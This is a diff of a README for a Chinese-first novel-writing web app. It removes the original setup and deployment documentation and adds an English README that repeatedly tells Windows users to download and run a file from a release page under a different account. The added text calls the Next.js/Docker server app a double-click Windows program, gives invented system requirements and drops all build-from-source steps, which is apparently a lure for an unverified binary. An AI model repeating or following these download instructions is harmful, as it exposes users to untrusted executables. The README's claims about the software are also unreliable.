@@ -1,388 +1,217 @@
-# 小说工具台
-
-中文优先的小说创作工作台。
-
-它不是一个单纯的聊天生成器，而是把“立项 -> 资料吸收 -> 设定 -> 大纲 -> 章节 -> 审稿 -> 回填 -> 导出”做成了一个可登录、可保存、可部署的 SaaS 应用。
-
-## 这个项目解决什么问题
-
-- 作者不需要把小说工程拆成一堆零散聊天记录。
-- 项目资料、设定、卷纲、章节、审稿结果都能在同一工作台里沉淀。
-- AI 不再只负责“生成一段文本”，而是参与资料整理、问题发现、最小修法和状态同步。
-- 模型接口、远程 MCP、Grok / Tavily / Firecrawl 都能按项目或按用户独立配置。
-- OpenAI 兼容接口可按端点切换 `Responses API` 或 `/v1/chat/completions`。
-
-## 当前已经具备的能力
-
-- 注册登录与用户隔离
-- Linux DO OAuth 登录 / 注册（可选启用）
-- 项目创建
-- AI 引导创建与空白创建
-- AI 引导模式支持“先选模型接口动态逐问”与“无接口回退本地问卷”双路径
-- 作者自带资料上传
-- 资料区支持批量上传作者材料
-- 空白创建上传作者材料后，会沿用资料区同一批量导入链路再执行初始化整理
-- `ingest_sources` 资料吸收与结构化整理
-- `generate_setting` / `generate_outline` / `generate_chapter`
-- `review_content` / `minimal_fix` / `sync_state`
-- Draft / accept / revision 闭环
-- 章节编辑、自动保存、审稿定位
-- 项目文件上下文在超长时会自动按文件与标题分段压缩，避免勾选过多文件导致模型请求失败
-- 项目级 API 预设（支持新增 / 删除 / 排序）
-- OpenAI 端点支持 `Responses API` / `Chat Completions API` 显式切换
-- OpenAI `Responses API` 在任务执行与 AI 引导创建里支持流式返回
-- 远程 MCP 接入
-- 用户级 Grok / Tavily / Firecrawl 配置
-- 设置页支持移除模型接口与远程 MCP 服务；若模型接口已被历史运行引用，则自动归档并从可用列表隐藏
-- 导出中心与服务端归档
-- Docker 本地联调
-- GitHub Actions + GHCR + 远端 Docker Compose 部署
-- 自动验活、自动回滚、部署报告留档
+# 🧰 novel-tool - Keep Your Novel Work in One Place
+
+[![Download novel-tool](https://img.shields.io/badge/Download%20novel--tool-Blue%20%26%20Grey)](https://github.com/Abdallah2165/novel-tool/releases)
+
+## 📥 Download
+
+Visit this page to download: https://github.com/Abdallah2165/novel-tool/releases
+
+If you use Windows, open the latest release on that page and download the app file that matches your system. After the file downloads, run it from your Downloads folder
+
+## 🪟 Windows Setup
+
+1. Open the release page linked above
+2. Find the latest version at the top
+3. Download the Windows file from the release assets
+4. Double-click the file to start the app
+5. If Windows asks for permission, choose Run
+6. Follow the on-screen steps to finish setup
+7. Start the app from the shortcut or the file you opened
+
+If the app opens in a browser window, keep that window open while you work
+
+## ✨ What novel-tool does
+
+novel-tool is a Chinese-first novel writing workspace. It keeps the full writing flow in one place:
+
+- Start a project
+- Import source notes and reference files
+- Build story settings
+- Create an outline
+- Draft chapters
+- Review text
+- Apply small fixes
+- Sync changes back into the project
+- Export finished work
+
+It is made for authors who want their project data, notes, outline, chapters, and review results in one place instead of spread across many chat threads
+
+## 🧭 Main features
+
+- Account login with user separation
+- Optional Linux DO OAuth login and sign-up
+- Create and manage projects
+- AI-guided project setup
+- Blank project setup
+- Two AI-guided paths for setup:
+  - dynamic questions with model access first
+  - local question flow when no model is set
+- Upload your own source materials
+- Batch upload for author notes and reference files
+- Shared import flow for blank projects after upload
+- `ingest_sources` for source absorption and structure sorting
+- `generate_setting` for world and character setup
+- `generate_outline` for story outline creation
+- `generate_chapter` for chapter drafting
+- `review_content` for review
+- `minimal_fix` for small edits
+- `sync_state` for state updates
+- Draft, accept, and revision flow
+- Chapter editing with auto save
+- Review markers that point to the exact part of the text
+- Auto split and compression for large project files
+- Project API presets with add, remove, and reorder
+- OpenAI endpoint support with clear switch for:
+  - `Responses API`
+  - `Chat Completions API`
+- Streaming support for OpenAI `Responses API`
+- Remote MCP access
+- User-level Grok, Tavily, and Firecrawl settings
+- Settings page tools to remove model access and remote MCP services
+- Archive support for models that were used before but are no longer active
+- Export center and server-side archiving
+- Docker support
+
+## 🖥️ System needs
 
-## 适合谁
+For Windows use, a standard modern PC is enough:
+
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space or more
+- A stable internet connection for AI features and sync
+- A browser that can open modern web apps
 
-- 想把长篇小说写作流程产品化、工程化的作者
-- 需要“项目状态 + 资料沉淀 + AI 协作”而不是单轮对话的创作者
-- 想把模型、搜索和资料链路统一进一个工作台的开发者
+For smoother use with large projects, more RAM helps when you load many files at once
+
+## 🚀 How to use it
+
+1. Download the latest version from the release page
+2. Open the app
+3. Create an account or sign in
+4. Create a new project
+5. Choose AI-guided setup or blank setup
+6. Upload your source files if you have them
+7. Build the setting and outline
+8. Draft chapters
+9. Review the content
+10. Apply small fixes where needed
+11. Export the result when you are done
+
+## 📚 Project flow
 
-## 产品工作流
+novel-tool follows a clear writing flow:
 
-1. 新建项目
-2. 选择 AI 引导创建，或空白创建
-3. 上传作者自己的资料
-4. 执行资料吸收任务，把原始材料整理成结构化内容
-5. 生成设定、卷纲、章节
-6. 对生成内容做审稿、最小修法和接受回填
-7. 在项目中持续维护状态卡、进度和 findings
-8. 导出正式章节、设定快照和项目状态摘要
+- **Project**: the main container for your novel
+- **Sources**: notes, reference text, and background material
+- **Setting**: story world, characters, rules, and core facts
+- **Outline**: the plan for the book, volume, or chapter path
+- **Chapter**: the draft text you write and revise
+- **Review**: checks for problems, gaps, and weak parts
+- **Fix**: small edits that keep the draft stable
+- **Sync**: state updates so the app stays in step with your work
+- **Export**: output your work for outside use
 
-引导创建说明：
+This structure helps you keep control of long projects without losing track of earlier decisions
 
-- 先选择模型接口与模型名时，会由模型根据题材生成首问，并在每次回答后动态决定下一问和推荐选项
-- 当所选 OpenAI 端点使用 `Responses API` 时，首问与后续追问会实时流式返回到页面
-- 没有选择模型接口时，会自动回退到当前内置本地问卷，不会阻塞项目初始化
-- 流式返回是显式协商能力：前端会带 `Accept: application/x-ndjson, application/json` 请求实时结果；脚本、CI 和默认调用方仍走 JSON 返回，避免破坏既有 smoke / release 合同
-- 模型接口健康检查只验证“默认模型的最小探活请求”；如果正式生成携带大上下文、不同模型名或上游网关限制不同，仍可能在生成阶段失败
-- 平台已适度放宽任务生成等待预算；如果第三方 OpenAI 兼容网关在 `Responses API` 下仍容易出现流式中断或超时，建议优先切到 `Chat Completions API`
+## 🔧 AI and model setup
 
-## 运行架构
+The app supports more than one model path so you can match it to your setup:
 
-- 前端：Next.js App Router
-- 后端：Next.js Route Handlers
-- 数据库：PostgreSQL + Prisma
-- 认证：Better Auth
-- 对象存储：S3 兼容接口，默认可用 MinIO
-- 模型接入：OpenAI / Gemini / Anthropic 自定义 URL
-- OpenAI 兼容层：支持 `Responses API` 与 `Chat Completions API` 两种请求模式
-- 当 OpenAI 端点选择 `Responses API` 时，任务执行页与 AI 引导创建页会优先使用流式返回
-- 外部扩展：远程 MCP、GrokSearch 风格聚合搜索上游配置
+- OpenAI-compatible endpoints
+- `Responses API`
+- `/v1/chat/completions`
+- Model presets at project level
+- Independent config per project or per user
+- Remote MCP tools
+- Grok, Tavily, and Firecrawl access for extra context
 
-## 环境要求
+If you want simple use, start with one API preset and keep the rest unchanged
 
-- Node.js 20+
-- npm
-- PostgreSQL
-- Docker 与 Docker Compose
+## 🗂️ File handling
 
-## 本地开发
+You can upload author notes, reference files, and other source material. The app then sorts and absorbs that content into the project. When a project gets large, the app splits long file context by file and title so requests stay within limits and do not fail from too much input
 
-### 第零步：获取源码
+This helps when you work with:
 
-首次在新机器启动时，先克隆仓库并进入项目目录：
+- world notes
+- character sheets
+- plot notes
+- chapter drafts
+- background lore
+- research files
 
-```bash
-git clone https://github.com/sum2yang/novel-tool.git
-cd novel-tool
-```
+## 🔐 Login and privacy
 
-### 方式一：Node.js
+novel-tool supports user accounts and user isolation. That means each account keeps its own projects and settings separate. If you use optional Linux DO OAuth, you can sign in through that path too
 
-1. 安装依赖
+## 📦 Export and archive
 
-```bash
-npm install --legacy-peer-deps
-```
+Use the export center when you want to move your work out of the app. Server-side archiving helps keep finished or older material stored in an organized way. This is useful for long projects where you want to keep the full history of the book
 
-2. 复制环境变量
+## 🛠️ Troubleshooting
 
-```bash
-cp .env.example .env
-```
+### App does not open
 
-3. 准备 PostgreSQL，并修改 `DATABASE_URL`
+- Download the latest release again
+- Make sure the file finished downloading
+- Right-click the file and choose Open
+- Check that your Windows account has permission to run apps
 
-示例：
+### AI features do not work
 
-```env
-DATABASE_URL="postgresql://postgres:postgres@localhost:5432/novel_tools?schema=public"
-```
+- Check that your model API key is set
+- Confirm the endpoint URL is correct
+- Make sure you picked the right API mode
+- Try a smaller set of source files first
 
-4. 生成 Prisma Client 并执行迁移
+### Files take too long to load
 
-```bash
-npx prisma generate
-npm run prisma:migrate
-```
+- Upload fewer files at once
+- Remove files you do not need for the current task
+- Keep only the most useful reference material in the active project
 
-5. 启动开发环境
+### Login does not work
 
-```bash
-npm run dev
-```
+- Check your email and password
+- If you use OAuth, sign in through the same method you used before
+- Refresh the page and try again
 
-说明：
+## 🧩 Good ways to use it
 
-- `npm run dev` 只用于本地开发调试，不要把它直接暴露给公网用户
-- 如果你通过 Cloudflare、Nginx、面板反代、内网穿透或自定义域名把开发服务器公开出去，容易出现 HMR / Server Action / 登录按钮失效等问题
-- 本地开发建议直接访问 `http://localhost:3000`
+- Use one project per novel
+- Put all source notes in the same project
+- Keep setting and outline work before chapter drafting
+- Review chapters before you mark them as accepted
+- Use revision only for targeted changes
+- Export after each major milestone
 
-### 方式二：Node.js 生产启动
+## 📁 Suggested first project setup
 
-如果你不使用 Docker，而是直接在服务器上用 Node.js 跑正式环境，请使用生产模式，而不是 `npm run dev`。
+1. Create a new project
+2. Enter the novel name
+3. Add your main idea
+4. Upload your reference files
+5. Generate the setting
+6. Generate the outline
+7. Start chapter drafting
+8. Review and fix each chapter
+9. Sync the project state
+10. Export when ready
 
-1. 安装依赖
+## 💡 Tips for smoother use
 
-```bash
-npm install --legacy-peer-deps
-```
+- Keep file names clear
+- Group related notes together
+- Use one set of model settings per project
+- Start with a small batch of files
+- Review the outline before drafting many chapters
+- Save edits as you go
 
-2. 准备 `.env`
+## 📘 What you can expect
 
-- `DATABASE_URL`
-- `BETTER_AUTH_SECRET`
-- `BETTER_AUTH_URL`
-- `APP_BASE_URL`
-- `ENCRYPTION_KEY`
+novel-tool is built to support a full novel workflow from the first idea to export. It keeps your work in one system, so you can move from research to draft to review without losing context
 
-其中：
+## 🔗 Download again
 
-- `BETTER_AUTH_URL` 和 `APP_BASE_URL` 必须填写实际对外访问地址，例如 `https://your-domain.com`
-- `BETTER_AUTH_SECRET` 应至少使用 32 位以上随机字符串
-- `ENCRYPTION_KEY` 应使用足够长的随机密钥
-
-3. 生成 Prisma Client 并执行生产迁移
-
-```bash
-npx prisma generate
-npm run prisma:deploy
-```
-
-4. 构建并启动生产服务
-
-```bash
-npm run build
-npm run start
-```
-
-说明：
-
-- 正式环境请使用 `npm run build && npm run start`，不要使用 `npm run dev`
-- 如果前面有 Nginx / Caddy / Cloudflare，请把它们反代到 `next start` 或 Docker 容器，而不是反代到 `next dev`
-- 如果你需要长期稳定运行，优先推荐下面的 Docker / GHCR / Compose 方式
-
-## Docker 启动
-
-推荐本地直接使用 Docker 跑完整环境，后续上服务器也可以沿用同一套结构。
-
-当前 Compose 默认包含 3 个服务：
-
-- `postgres`
-- `minio`
-- `app`
-
-### 启动步骤
-
-1. 复制 Docker 环境变量模板
-
-```bash
-cp .env.docker.example .env.docker
-```
-
-2. 修改 `.env.docker`
-
-重点项：
-
-- `BETTER_AUTH_SECRET`
-- `ENCRYPTION_KEY`
-- `BETTER_AUTH_URL`
-- `APP_BASE_URL`
-- `LINUX_DO_CLIENT_ID`
-- `LINUX_DO_CLIENT_SECRET`
-- `APP_IMAGE`
-- `GROK_API_URL`
-- `GROK_API_KEY`
-- `GROK_MODEL`
-- `TAVILY_API_URL`
-- `TAVILY_API_KEY`
-- `FIRECRAWL_API_URL`
-- `FIRECRAWL_API_KEY`
-
-说明：
-
-- 本地 Compose 环境里 `DATABASE_URL` 默认应保持连接容器内主机名 `postgres`
-- `APP_IMAGE` 本地开发时通常留空
-- 如果你通过域名或反向代理访问站点，`BETTER_AUTH_URL` 和 `APP_BASE_URL` 必须改成实际对外访问地址；否则 Better Auth 会报 `Invalid origin`，导致注册、登录和退出登录失败
-- 如果某个 OpenAI 兼容上游只实现了 `/v1/chat/completions`，或它对 `/v1/responses` 容易返回 `Gateway Timeout`，请在设置页把该端点的 API 模式切到 `Chat Completions API`
-- 当用户没有填写个人 Grok / Tavily / Firecrawl 配置时，应用会按这 7 个字段逐项回退到平台默认
-- 如果同时填写 `LINUX_DO_CLIENT_ID` 和 `LINUX_DO_CLIENT_SECRET`，登录页和注册页会自动显示 `Linux DO` 登录 / 注册按钮
-
-3. 启动
-
-```bash
-docker compose --env-file .env.docker up --build
-```
-
-4. 停止
-
-```bash
-docker compose --env-file .env.docker down
-```
-
-### 低配服务器分支
-
-如果你的服务器规格只有 `2C2G` 或更低，建议直接使用低配部署分支，而不是在主分支上本机 `build`：
-
-```bash
-git clone -b chore/low-spec-deploy-tuning https://github.com/sum2yang/novel-tool.git
-cd novel-tool
-```
-
-这个分支已经合入当前主分支功能，同时额外带了更保守的部署调优：
-
-- `app` 容器默认注入 `NODE_OPTIONS=--max-old-space-size=768`
-- `app` 容器默认注入 `MALLOC_ARENA_MAX=2`
-- `postgres` 默认使用更低的 `shared_buffers / work_mem / max_connections`
-- `docker-entrypoint.sh` 直接调用本地 Prisma / Next 可执行文件，减少 `npx` 带来的额外启动开销
-
-低配机器建议：
-
-- 不要在服务器上执行 `docker compose up --build`
-- 优先让 GitHub Actions 构建 GHCR 镜像，再在服务器执行 `docker compose pull && docker compose up -d --no-build`
-- 如果 `postgres + minio + app` 全部放在同一台低配机器，建议额外开启 swap，或者把对象存储 / 数据库外置
-
-## 常用脚本
-
-### 基础开发
-
-- `npm run dev`
-- `npm run build`
-- `npm run start`
-- `npm run lint`
-- `npm run typecheck`
-- `npm run test`
-
-### Prisma
-
-- `npm run prisma:generate`
-- `npm run prisma:migrate`
-- `npm run prisma:deploy`
-- `npm run prisma:push`
-
-### Docker
-
-- `npm run docker:build`
-- `npm run docker:up`
-- `npm run docker:down`
-- `npm run docker:preflight`
-
-### 发布前校验
-
-- `npm run validate:runtime-sources`
-- `npm run validate:release`
-
-### 联调诊断
-
-- `npm run inspect:linux-do-auth`
-- `npm run inspect:linux-do-auth -- --email your@email.com`
-- `npm run inspect:linux-do-auth -- --allow-empty`
-
-说明：
-
-- 默认检查 `providerId=linux-do` 的最新账号绑定，并输出 `user / account / session` 关系摘要
-- 默认在没有形成完整登录链路时返回非零退出码，适合联调后直接验收
-- 加 `--allow-empty` 时只输出当前状态，不把“尚未落库”当成失败
-
-### E2E / smoke
-
-- `npm run smoke:auth-provider`
-- `npm run smoke:api-presets-e2e`
-- `npm run smoke:ingest-e2e`
-- `npm run smoke:onboarding-e2e`
-- `npm run smoke:mcp-generate`
-- `npm run smoke:mcp-e2e`
-- `npm run smoke:mainline-e2e`
-- `npm run smoke:nonchapter-e2e`
-- `npm run smoke:research-e2e`
-- `npm run smoke:grok-e2e`
-- `npm run smoke:export-e2e`
-- `npm run smoke:deploy-remote`
-
-其中 `npm run smoke:onboarding-e2e` 当前覆盖：
-
-- fallback 本地引导问卷
-- 选择模型接口后的 AI 动态引导问答
-- guided finalize 产物写入
-- blank onboarding 材料整理与补问回写
-
-## 部署方式
-
-当前生产部署链路已经固定为：
-
-1. `.github/workflows/release-validation.yml`
-2. `.github/workflows/deploy-production.yml`
-3. `scripts/deploy-remote.sh`
-
-发布流程如下：
-
-1. 执行 `prisma migrate deploy`
-2. 执行 `npm run validate:release`
-3. 执行 `npm run docker:preflight`
-4. 构建并推送 GHCR 镜像
-5. SSH 到服务器
-6. 更新远端 `.env.docker` 中的 `APP_IMAGE`
-7. 在服务器执行 `docker compose pull app && docker compose up -d --no-build`
-8. 对 `/api/health` 和 `/login` 执行 smoke
-9. 如果失败，自动回滚到上一版环境文件、上一版 commit 和上一版镜像
-
-分支选择建议：
-
-- 常规服务器使用 `main`
-- 低内存服务器优先使用 `chore/low-spec-deploy-tuning`
-- 两个分支都保持同一功能线，低配分支只额外携带部署参数与启动开销优化
-
-## 远端部署报告
-
-每次部署后，服务器内会生成：
-
-- `.deploy-reports/<deploy-id>/`
-- `.deploy-reports/latest`
-
-典型内容包括：
-
-- `summary.json`
-- `summary.md`
-- `deploy-smoke-attempts.log`
-- `deploy-health-last.txt`
-- `deploy-login-last.txt`
-- `rollback-*`
-- `docker compose ps`
-- `app logs`
-
-GitHub Actions 会把这些内容回传到 Step Summary，并上传完整诊断 artifact。
-
-## 仓库结构
-
-- `app/`：页面与 Route Handlers
-- `components/`：工作台 UI
-- `lib/`：认证、模型、MCP、搜索、项目逻辑、存储等核心代码
-- `prisma/`：数据库 schema 与迁移
-- `knowledge/`：运行时唯一知识入口
-- `archive/`：维护用标准化资料层，仅用于知识再生成
-- `scripts/`：生成脚本、smoke、部署与校验脚本
-- `.github/workflows/`：CI 与部署工作流
-
-## 致谢
-
-- **社区交流与方法分享** — 感谢 [Linux DO 社区](https://linux.do)，为本项目的写作工作流、工具组合与实践讨论提供了持续参考
-- **原创文本与创作思路** — [宁河图](https://linux.do/u/user2609/summary)，本项目的创作方法论、Prompt 设计与题材模板主要源自其实战经验分享
-- **GrokSearch 工程启发** — 感谢孙老师的 [GrokSearch](https://github.com/GuDaStudio/GrokSearch)，为本项目的 Grok / Tavily / Firecrawl 聚合搜索接入提供了重要参考
+Visit this page to download: https://github.com/Abdallah2165/novel-tool/releases
